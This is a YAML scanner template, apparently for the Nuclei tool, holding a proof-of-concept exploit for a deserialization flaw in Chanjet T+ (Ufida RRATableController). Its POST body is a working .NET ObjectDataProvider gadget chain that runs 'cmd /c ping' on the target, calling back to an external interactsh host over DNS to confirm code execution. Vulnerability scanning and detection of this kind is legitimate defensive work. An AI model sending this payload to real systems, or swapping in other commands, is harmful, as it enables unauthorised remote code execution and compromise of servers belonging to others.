id: poc-yaml-changjie-tplus-ufida-t-di-uip-rra-rratablecontroller-deserialization

info:
  name: Changjie T+ Ufida.T.DI.UIP.RRA.RRATableController Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: dnslog, deserialization

variables:
  reverse: "{{interactsh-url}}"

http:
  - method: POST
    path:
      - "/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore"
    headers:
      Content-Type: application/json
    body: |-
      {
       "storeID":{
       "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, 
      Culture=neutral, PublicKeyToken=31bf3856ad364e35",
       "MethodName":"Start",
       "ObjectInstance":{
       "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, 
      PublicKeyToken=b77a5c561934e089",
       "StartInfo": {
       "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, 
      PublicKeyToken=b77a5c561934e089",
       "FileName":"cmd", "Arguments":"/c ping {{reverse}}"
       }
       }
       }
      }
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "actorId或archivesId不能为空"
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
